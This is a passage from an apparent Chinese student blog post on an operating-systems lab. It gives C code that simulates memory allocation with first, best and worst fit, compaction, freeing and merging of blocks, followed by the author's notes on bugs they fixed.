class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (ma_algorithm == <span class="number">3</span>)	<span class="comment">//如果是WF算法，则直接查找最后一个空闲块</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">while</span> (ne)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (ne != free_block_head)	fbt = pre;</span><br><span class="line">				pre = ne;</span><br><span class="line">				ne = ne-&gt;next;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (pre-&gt;size &gt;= request_size)	allocate_flag = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (request_size &lt;= pre-&gt;size)</span><br><span class="line">			allocate_flag = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (allocate_flag)	<span class="comment">//找到可用空闲区，判断需不需要一起分配剩余内存空间</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((pre-&gt;size - request_size) &gt;= MIN_SLICE)	<span class="comment">//找到可满足空闲分区且分配后剩余空间比较大，则正常分配</span></span><br><span class="line">		&#123;</span><br><span class="line">			pre-&gt;size = pre-&gt;size - request_size;</span><br><span class="line">			ab-&gt;start_addr = pre-&gt;start_addr;</span><br><span class="line">			pre-&gt;start_addr += ab-&gt;size;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">else</span>	<span class="comment">//找到可满足空闲分区且分配后剩余空间比较小，则一起分配，删除该节点</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (fbt == pre)	<span class="comment">//如果头块满足条件</span></span><br><span class="line">			&#123;</span><br><span class="line">				fbt = pre-&gt;next;</span><br><span class="line">				free_block_head = fbt;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>	<span class="comment">//中间空闲块满足条件</span></span><br><span class="line">				fbt-&gt;next = pre-&gt;next;</span><br><span class="line"></span><br><span class="line">			ab-&gt;start_addr = pre-&gt;start_addr;</span><br><span class="line">			ab-&gt;size = pre-&gt;size;</span><br><span class="line">			<span class="built_in">free</span>(pre);	<span class="comment">//释放节点</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		mem_size -= ab-&gt;size;</span><br><span class="line">		rearrange(ma_algorithm);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span>	<span class="comment">//找不到空闲区，则进行内存紧缩</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (mem_size &gt;= request_size)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (mem_size &gt;= request_size + MIN_SLICE)	<span class="comment">//分配完内存后还留有空闲内存</span></span><br><span class="line">				free_memory_rearrange(mem_size - request_size, request_size);</span><br><span class="line">			<span class="keyword">else</span>	<span class="comment">//分配完内存后无空闲内存</span></span><br><span class="line">				free_memory_rearrange(<span class="number">0</span>, mem_size);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="紧缩处理">紧缩处理</h5>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free_memory_rearrange</span><span class="params">(<span class="type">int</span> memory_reduce_size, <span class="type">int</span> allocated_size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">free_block_type</span>* <span class="title">f1</span>, * <span class="title">f2</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">allocated_block</span>* <span class="title">a1</span>, * <span class="title">a2</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//空闲块处理</span></span><br><span class="line">	<span class="keyword">if</span> (memory_reduce_size != <span class="number">0</span>)	<span class="comment">//分配完剩余空间大于最小内存碎片</span></span><br><span class="line">	&#123;</span><br><span class="line">		f1 = free_block_head;</span><br><span class="line">		f2 = f1-&gt;next;</span><br><span class="line"></span><br><span class="line">		f1-&gt;start_addr = mem_size_total - memory_reduce_size;</span><br><span class="line">		f1-&gt;size = memory_reduce_size;</span><br><span class="line">		f1-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">		mem_size = memory_reduce_size;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		f2 = free_block_head;</span><br><span class="line">		free_block_head = <span class="literal">NULL</span>;</span><br><span class="line">		mem_size = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (f2 != <span class="literal">NULL</span>)	<span class="comment">//逐一释放空闲内存块节点</span></span><br><span class="line">	&#123;</span><br><span class="line">		f1 = f2;</span><br><span class="line">		f2 = f2-&gt;next;</span><br><span class="line">		<span class="built_in">free</span>(f1);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//加载块处理</span></span><br><span class="line">	a1 = (<span class="keyword">struct</span> allocated_block*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> allocated_block));</span><br><span class="line">	a1-&gt;pid = pid;</span><br><span class="line">	a1-&gt;size = allocated_size;</span><br><span class="line">	a1-&gt;start_addr = mem_size_total - memory_reduce_size - a1-&gt;size;</span><br><span class="line">	<span class="built_in">sprintf</span>(a1-&gt;process_name, <span class="string">&quot;PROCESS-%02d&quot;</span>, pid);</span><br><span class="line"></span><br><span class="line">	a1-&gt;next = allocated_block_head;</span><br><span class="line">	a2 = allocated_block_head;</span><br><span class="line">	allocated_block_head = a1;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (a2 != <span class="literal">NULL</span>)	<span class="comment">//逐一将加载块相邻放置</span></span><br><span class="line">	&#123;</span><br><span class="line">		a2-&gt;start_addr = a1-&gt;start_addr - a2-&gt;size;</span><br><span class="line">		a1 = a2;</span><br><span class="line">		a2 = a2-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="删除进程移出内存">删除进程移出内存</h4>
<h5 id="删除进程">删除进程</h5>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">kill_process</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">allocated_block</span>* <span class="title">ab</span>;</span></span><br><span class="line">	<span class="type">int</span> pid;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nKill Process, pid = &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;pid);</span><br><span class="line">	ab = find_process(pid);	<span class="comment">//找到要删除的块</span></span><br><span class="line">	<span class="keyword">if</span> (ab != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		free_mem(ab);	<span class="comment">//释放ab所表示的分配区</span></span><br><span class="line">		dispose(ab);	<span class="comment">//释放ab数据结构节点</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="找到进程">找到进程</h5>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> allocated_block* <span class="title function_">find_process</span><span class="params">(<span class="type">int</span> pid)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">allocated_block</span>* <span class="title">p</span>;</span></span><br><span class="line">	p = allocated_block_head;</span><br><span class="line">	<span class="keyword">while</span> (p)	<span class="comment">//遍历链表找pid对应进程</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (p-&gt;pid == pid)</span><br><span class="line">			<span class="keyword">return</span> p;	<span class="comment">//找到则返回struct</span></span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nProcess not found!\n&quot;</span>);	<span class="comment">//没有找到则报错并返回NULL</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="归还分配区并合并">归还分配区并合并</h5>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">free_mem</span><span class="params">(<span class="keyword">struct</span> allocated_block* ab)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> algorithm = ma_algorithm;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">free_block_type</span>* <span class="title">fbt</span>, * <span class="title">left</span>, * <span class="title">right</span>;</span>	<span class="comment">//链表结构认为从左指向右，fbt存储要释放的分区</span></span><br><span class="line">    	<span class="comment">//left为插入后左边（靠近表头）的空闲分区、right为插入后右边（远离表头）的空闲分区</span></span><br><span class="line">	mem_size += ab-&gt;size;</span><br><span class="line"></span><br><span class="line">	fbt = (<span class="keyword">struct</span> free_block_type*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> free_block_type));</span><br><span class="line">	<span class="keyword">if</span> (!fbt)	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//回收内存4种情况：</span></span><br><span class="line">	<span class="comment">// 1. 当前空闲分区和右边空闲分区相邻，合并为同一个分区，且释放右边分区 </span></span><br><span class="line">	<span class="comment">// 2. 当前空闲分区和左边空闲分区相邻，合并为同一个分区，且释放当前分区</span></span><br><span class="line">	<span class="comment">// 3. 当前空闲分区和左右空闲分区都相邻，合并为同一个分区，且释放当前和右边分区</span></span><br><span class="line">	<span class="comment">// 4. 无相邻空闲分区，则插入一个新表项</span></span><br><span class="line"></span><br><span class="line">	fbt-&gt;size = ab-&gt;size;</span><br><span class="line">	fbt-&gt;start_addr = ab-&gt;start_addr;</span><br><span class="line">	fbt-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	rearrange(MA_FF);</span><br><span class="line"></span><br><span class="line">	left = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">//从头开始按照起始地址顺序遍历，判断插入链表的位置</span></span><br><span class="line">	right = free_block_head;</span><br><span class="line">	<span class="keyword">while</span> ((right != <span class="literal">NULL</span>) &amp;&amp; (fbt-&gt;start_addr &lt; right-&gt;start_addr))</span><br><span class="line">	&#123;</span><br><span class="line">		left = right;</span><br><span class="line">		right = right-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!left)	<span class="comment">//插入位置为链表头</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!right)	<span class="comment">//如果释放内存前已经没有空闲分区</span></span><br><span class="line">			free_block_head = fbt;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			fbt-&gt;next = right;</span><br><span class="line">			free_block_head = fbt;</span><br><span class="line">			<span class="keyword">if</span> (right-&gt;start_addr + right-&gt;size == fbt-&gt;start_addr)	<span class="comment">//判断释放的空闲区间和右边空闲分区是否相邻，是则合并</span></span><br><span class="line">			&#123;</span><br><span class="line">				fbt-&gt;next = right-&gt;next;</span><br><span class="line">				fbt-&gt;start_addr = right-&gt;start_addr;</span><br><span class="line">				fbt-&gt;size = fbt-&gt;size + right-&gt;size;</span><br><span class="line">				<span class="built_in">free</span>(right);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span>	</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!right)	<span class="comment">//如果插入的位置在链表尾</span></span><br><span class="line">		&#123;</span><br><span class="line">			left-&gt;next = fbt;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (fbt-&gt;start_addr + fbt-&gt;size == left-&gt;start_addr)	<span class="comment">//判断释放的空闲区间和左边空闲分区是否相邻，是则合并</span></span><br><span class="line">			&#123;</span><br><span class="line">				left-&gt;next = right;</span><br><span class="line">				left-&gt;size = fbt-&gt;size + left-&gt;size;</span><br><span class="line">				left-&gt;start_addr = fbt-&gt;start_addr;</span><br><span class="line">				<span class="built_in">free</span>(fbt);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">else</span>	<span class="comment">//如果插入的位置在链表中间</span></span><br><span class="line">		&#123;</span><br><span class="line">			fbt-&gt;next = right;</span><br><span class="line">			left-&gt;next = fbt;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> ((fbt-&gt;start_addr + fbt-&gt;size == left-&gt;start_addr) &amp;&amp; (right-&gt;start_addr + right-&gt;size == fbt-&gt;start_addr))	<span class="comment">//和左右都相邻</span></span><br><span class="line">			&#123;</span><br><span class="line">				left-&gt;next = right-&gt;next;</span><br><span class="line">				left-&gt;size += fbt-&gt;size + right-&gt;size;</span><br><span class="line">				left-&gt;start_addr = right-&gt;start_addr;</span><br><span class="line">				<span class="built_in">free</span>(fbt);</span><br><span class="line">				<span class="built_in">free</span>(right);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (fbt-&gt;start_addr + fbt-&gt;size == left-&gt;start_addr)	<span class="comment">//和左边相邻</span></span><br><span class="line">			&#123;</span><br><span class="line">				left-&gt;next = right;</span><br><span class="line">				left-&gt;size = fbt-&gt;size + left-&gt;size;</span><br><span class="line">				left-&gt;start_addr = fbt-&gt;start_addr;</span><br><span class="line">				<span class="built_in">free</span>(fbt);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (right-&gt;start_addr + right-&gt;size == fbt-&gt;start_addr)	<span class="comment">//和右边相邻</span></span><br><span class="line">			&#123;</span><br><span class="line">				fbt-&gt;next = right-&gt;next;</span><br><span class="line">				fbt-&gt;start_addr = right-&gt;start_addr;</span><br><span class="line">				fbt-&gt;size = fbt-&gt;size + right-&gt;size;</span><br><span class="line">				<span class="built_in">free</span>(right);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	rearrange(ma_algorithm);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="释放ab数据结构节点">释放ab数据结构节点</h5>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">dispose</span><span class="params">(<span class="keyword">struct</span> allocated_block* free_ab)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">allocated_block</span>* <span class="title">pre</span>, * <span class="title">ab</span>;</span></span><br><span class="line">	<span class="keyword">if</span> (free_ab == allocated_block_head)	<span class="comment">//如果释放头节点</span></span><br><span class="line">	&#123;</span><br><span class="line">		allocated_block_head = allocated_block_head-&gt;next;</span><br><span class="line">		<span class="built_in">free</span>(free_ab);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pre = allocated_block_head;</span><br><span class="line">	ab = allocated_block_head-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (ab != free_ab)	<span class="comment">//遍历链表找到要释放的节点</span></span><br><span class="line">	&#123;</span><br><span class="line">		pre = ab;</span><br><span class="line">		ab = ab-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	pre-&gt;next = ab-&gt;next;</span><br><span class="line">	<span class="built_in">free</span>(ab);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="显示内存状态">显示内存状态</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">display_mem_usage</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">free_block_type</span>* <span class="title">fbt</span> =</span> free_block_head;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">allocated_block</span>* <span class="title">ab</span> =</span> allocated_block_head;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;-------------------------------------------------------------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//显示空闲区</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Free Memory:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%20s %20s\n&quot;</span>, <span class="string">&quot;start_addr&quot;</span>, <span class="string">&quot;size&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span> (fbt != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%20d %20d\n&quot;</span>, fbt-&gt;start_addr, fbt-&gt;size);</span><br><span class="line">		fbt = fbt-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//显示已分配区</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nUsed Memory:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%10s %20s %10s %10s\n&quot;</span>, <span class="string">&quot;PID&quot;</span>, <span class="string">&quot;Process Name&quot;</span>, <span class="string">&quot;start_addr&quot;</span>, <span class="string">&quot;size&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span> (ab != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%10d %20s %10d %10d\n&quot;</span>, ab-&gt;pid, ab-&gt;process_name, ab-&gt;start_addr, ab-&gt;size);</span><br><span class="line">		ab = ab-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;-------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="三种算法">三种算法</h4>
<h5 id="ff算法">FF算法</h5>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">rearrange_FF</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">free_block_type</span>* <span class="title">p</span>, * <span class="title">p1</span>, * <span class="title">p2</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">free_block_type</span>* <span class="title">last_block</span>;</span></span><br><span class="line">	p1 = (<span class="keyword">struct</span> free_block_type*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> free_block_type));</span><br><span class="line">	p1-&gt;next = free_block_head;</span><br><span class="line">	free_block_head = p1;</span><br><span class="line">	<span class="keyword">if</span> (free_block_head != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (last_block = <span class="literal">NULL</span>; last_block != free_block_head; last_block = p)	<span class="comment">//冒泡排序，按起始地址从大到小排</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (p = p1 = free_block_head; p1-&gt;next != <span class="literal">NULL</span> &amp;&amp; p1-&gt;next-&gt;next != <span class="literal">NULL</span> &amp;&amp; p1-&gt;next-&gt;next != last_block; p1 = p1-&gt;next)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (p1-&gt;next-&gt;start_addr &lt; p1-&gt;next-&gt;next-&gt;start_addr)</span><br><span class="line">				&#123;</span><br><span class="line">					p2 = p1-&gt;next-&gt;next;</span><br><span class="line">					p1-&gt;next-&gt;next = p2-&gt;next;</span><br><span class="line"></span><br><span class="line">					p2-&gt;next = p1-&gt;next;</span><br><span class="line">					p1-&gt;next = p2;</span><br><span class="line"></span><br><span class="line">					p = p1-&gt;next-&gt;next;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	p1 = free_block_head;</span><br><span class="line">	free_block_head = free_block_head-&gt;next;</span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="bf算法">BF算法</h5>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">rearrange_BF</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">free_block_type</span>* <span class="title">p</span>, * <span class="title">p1</span>, * <span class="title">p2</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">free_block_type</span>* <span class="title">last_block</span>;</span></span><br><span class="line">	p1 = (<span class="keyword">struct</span> free_block_type*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> free_block_type));</span><br><span class="line">	p1-&gt;next = free_block_head;</span><br><span class="line">	free_block_head = p1;</span><br><span class="line">	<span class="keyword">if</span> (free_block_head != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (last_block = <span class="literal">NULL</span>; last_block != free_block_head; last_block = p)	<span class="comment">//冒泡排序，按块大小从大到小排</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (p = p1 = free_block_head; p1-&gt;next != <span class="literal">NULL</span> &amp;&amp; p1-&gt;next-&gt;next != <span class="literal">NULL</span> &amp;&amp; p1-&gt;next-&gt;next != last_block; p1 = p1-&gt;next)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (p1-&gt;next-&gt;size &lt; p1-&gt;next-&gt;next-&gt;size)</span><br><span class="line">				&#123;</span><br><span class="line">					p2 = p1-&gt;next-&gt;next;</span><br><span class="line">					p1-&gt;next-&gt;next = p2-&gt;next;</span><br><span class="line"></span><br><span class="line">					p2-&gt;next = p1-&gt;next;</span><br><span class="line">					p1-&gt;next = p2;</span><br><span class="line"></span><br><span class="line">					p = p1-&gt;next-&gt;next;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	p1 = free_block_head;</span><br><span class="line">	free_block_head = free_block_head-&gt;next;</span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line">	p1 = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="wf算法">WF算法</h5>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">rearrange_WF</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">free_block_type</span>* <span class="title">p</span>, * <span class="title">p1</span>, * <span class="title">p2</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">free_block_type</span>* <span class="title">last_block</span>;</span></span><br><span class="line">	p1 = (<span class="keyword">struct</span> free_block_type*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> free_block_type));</span><br><span class="line">	p1-&gt;next = free_block_head;</span><br><span class="line">	free_block_head = p1;</span><br><span class="line">	<span class="keyword">if</span> (free_block_head != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">for</span> (last_block = <span class="literal">NULL</span>; last_block != free_block_head; last_block = p)	<span class="comment">//冒泡排序，按块大小从小到大排</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (p = p1 = free_block_head; p1-&gt;next != <span class="literal">NULL</span> &amp;&amp; p1-&gt;next-&gt;next != <span class="literal">NULL</span> &amp;&amp; p1-&gt;next-&gt;next != last_block; p1 = p1-&gt;next)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (p1-&gt;next-&gt;size &gt; p1-&gt;next-&gt;next-&gt;size)</span><br><span class="line">				&#123;</span><br><span class="line">					p2 = p1-&gt;next-&gt;next;</span><br><span class="line">					p1-&gt;next-&gt;next = p2-&gt;next; </span><br><span class="line"></span><br><span class="line">					p2-&gt;next = p1-&gt;next;</span><br><span class="line">					p1-&gt;next = p2;</span><br><span class="line"></span><br><span class="line">					p = p1-&gt;next-&gt;next;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	p1 = free_block_head;</span><br><span class="line">	free_block_head = free_block_head-&gt;next;</span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line">	p1 = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="退出程序">退出程序</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">do_exit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">free_block_type</span>* <span class="title">p1</span>, * <span class="title">p2</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">allocated_block</span>* <span class="title">a1</span>, * <span class="title">a2</span>;</span></span><br><span class="line">	p1 = free_block_head;</span><br><span class="line">	<span class="keyword">if</span> (p1 != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		p2 = p1-&gt;next;</span><br><span class="line">		<span class="keyword">for</span> (; p2 != <span class="literal">NULL</span>; p1 = p2, p2 = p2-&gt;next)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">free</span>(p1);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">free</span>(p1);</span><br><span class="line">	&#125;</span><br><span class="line">	a1 = allocated_block_head;</span><br><span class="line">	<span class="keyword">if</span> (a1 != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		a2 = a1-&gt;next;</span><br><span class="line">		<span class="keyword">for</span> (; a2 != <span class="literal">NULL</span>; a1 = a2, a2 = a2-&gt;next)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">free</span>(a1);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">free</span>(a1);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="避免采坑-6">避免采坑</h2>
<p>写了好几天，调了无数的bug，很多都由于当时沉迷分析调试改bug忘了记录了，只记几个问题吧。</p>
<p>给了个测试用例发现相邻空闲内存没有合并，如图：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/image-20191106233254914.png" class="" title="image-20191106233254914">
<p>经过调试发现是我排序算法写反了，本来FF排完序之后应该是从头开始起始地址从大到小排列，结果我写成从小到大排列了，而我合并的时候又是把起始地址按照从大到小的顺序插入，这样就导致相邻比较的时候是大的比小的，所以出错，改正之后就好了。</p>
<p>可是改正了之后又发现FF算法实际输出的效果是WF算法，经过分析发现是分配内存的时候出现了问题。我在遍历空闲块的时候直接找的是第一个满足条件的空闲块，而我的链表是从大到小排的，所以出现了问题。修改之后就发现程序一创建进程就崩溃，后来发现我的条件是pre!=NULL，当我所以空闲块都满足条件的时候最终的pre就越界，所以改成pre-&gt;next!=NULL就避免了越界。但是这样又发现程序报错。后来发现这样写的话，在一开始只有一个头结点的时候就会出错，因此又加了一个判断是否只有一个节点，这样就解决了问题。</p>
<p>再次调试的时候又发现内存紧缩模块有问题。</p>
<p>本来内存状态如下：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/image-20191107001256301.png" class="" title="image-20191107001256301">
<p>加了一个大小为800的PROCESS-06，结果如下：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/image-20191107001446943.png" class="" title="image-20191107001446943">
<p>调试发现是内存紧缩模块中处理加载块的时候把起始地址填错了</p>
<p><code>a1-&gt;start_addr = mem_size_total - memory_reduce_size</code>改成<code>a1-&gt;start_addr = mem_size_total - memory_reduce_size - a1-&gt;size</code>就对了</p>
<p>再次调试发现在内存紧缩后，显示内存状态程序就会崩溃，后来发现我在释放节点的时候把f1、f2写反了，这样导致在释放后free_block_head也被释放了，所以显示的时候就会出现问题。修改后就可以了。</p>
<p>后来发现内存紧缩在合并左右两个相邻块时会出问题，调试发现内存大小写错了，<code>left-&gt;size = fbt-&gt;size + right-&gt;size</code>;这样少了左边节点自身的大小，所以出问题。写成<code>left-&gt;size += fbt-&gt;size + right-&gt;size</code>;就没有问题了。</p>
<p>后来又发现内存紧缩的时候出现问题，算法是WF，状态如下：</p>
